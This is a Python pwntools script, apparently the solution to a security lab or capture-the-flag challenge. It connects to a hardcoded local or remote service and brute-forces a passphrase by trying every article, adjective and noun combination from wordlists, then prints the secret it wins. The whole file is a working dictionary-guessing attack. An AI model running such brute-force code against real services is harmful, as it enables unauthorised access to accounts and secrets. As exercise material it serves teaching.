#!/usr/bin/python3

from pwn import *
import sys

HOST = '141.85.224.104'
PORT = 20101
ARTICLES_FILE='articles.txt'
ADJECTIVES_FILE='adjectives.txt'
NOUNS_FILE='nouns.txt'

def getlines(filename):
    lines = []
    with open(filename) as f:
        lines = [x.strip() for x in f.readlines()]

    return lines

def is_right_guess(io, guess):
    io.sendline(guess)

    return io.recvline() != b'Try Again!\n'

def get_secret(io):
    return io.recv()

def break_passphrase(isLocal = 1):
    io = None

    if isLocal:
        io = remote('127.0.0.1', PORT)
    else:
        io = remote(HOST, PORT)

    io.recvuntil(b'Start playing!\n')

    articles = getlines('../../support/passphrase-guessing/remote/articles.txt')
    adjectives = getlines('../../support/passphrase-guessing/remote/adjectives.txt')
    nouns = getlines('../../support/passphrase-guessing/remote/nouns.txt')

    isGuessed = False
    for article in articles:
        for adjective in adjectives:
            for noun in nouns:
                current_passphrase = article + ' ' + adjective + ' ' + noun
                print('Trying guess: {}'.format(current_passphrase))

                if is_right_guess(io, current_passphrase):
                    isGuessed = True
                    break
            if isGuessed:
                break
        if isGuessed:
            break

    print(get_secret(io))

def main():
    isLocal = True
    if len(sys.argv) == 2:
        isLocal = bool(int(sys.argv[1]))

    break_passphrase(isLocal)

if __name__ == '__main__':
    main()
